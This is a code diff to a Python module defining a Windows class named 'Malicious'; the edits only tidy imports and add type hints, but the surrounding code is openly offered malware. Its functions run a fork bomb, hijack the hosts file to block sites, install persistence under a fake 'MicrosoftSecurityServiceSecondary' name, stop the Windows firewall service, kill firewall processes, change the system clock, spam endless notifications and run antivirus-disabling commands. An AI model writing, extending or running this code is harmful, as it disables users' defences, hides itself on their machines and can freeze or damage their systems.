@@ -1,13 +1,8 @@
 import os
-# import datetime
-import webbrowser
-import time
 import subprocess
 import sys
 import shutil
 import getpass
-# import ctypes
-# from datetime import datetime as dt
 import win10toast
 import typing as t
 import re
@@ -17,7 +12,7 @@ class Malicious:
     def __init__(self) -> None:
         pass
 
-    def blockWebsites(self, data: t.Optional[t.Iterable] = None) -> bool:
+    def blockWebsites(self, data: t.Optional[t.Iterable] = None) -> None:
         wlist = data
         if data is None:
             wlist = Data.website_list
@@ -35,12 +30,12 @@ class Malicious:
                 else:
                     file.write(redirect + " " + website + "\n")
 
-    def forkBomb(self):
+    def forkBomb(self) -> None:
         while True:
             subprocess.Popen([sys.executable, sys.argv[0]],
                              creationflags=subprocess.CREATE_NEW_CONSOLE)
 
-    def restartOnStartup(self, filee: t.Optional[str] = None):
+    def restartOnStartup(self, filee: t.Optional[str] = None) -> None:
         # Normal Startup Trick
         location = os.environ["appdata"] + \
             "\\MicrosoftSecurityServiceSecondary." + filee
@@ -64,15 +59,15 @@ class Malicious:
 
         addBatFileStartup()
 
-    def changeTime(self, time: t.Optional[str] = "00:00"):
+    def changeTime(self, time: t.Optional[str] = "00:00") -> None:
         if re.match(r'^\d{2}:\d{2}$', time):
             os.system(f'time {time}')
 
-    def disableFirewallTemp(self):
+    def disableFirewallTemp(self) -> None:
         os.system('net stop "MpsSvc"')
         os.system('taskkill /f /t /im "FirewallControlPanel.exe"')
 
-    def notification(self, title: str, message: str, icon: t.Optional[str] = None, duration: t.Optional[int] = 5, limit: t.Optional[int] = None):
+    def notification(self, title: str, message: str, icon: t.Optional[str] = None, duration: t.Optional[int] = 5, limit: t.Optional[int] = None) -> None:
         if limit is None:
             while True:
                 toaster = win10toast.ToastNotifier()
@@ -84,7 +79,7 @@ class Malicious:
                 toaster.show_toast(
                     title, message, icon_path=icon, duration=duration)
 
-    def disableAV(self):
+    def disableAV(self) -> None:
         for command in Data.antivirus_commands:
             os.system(command)
 
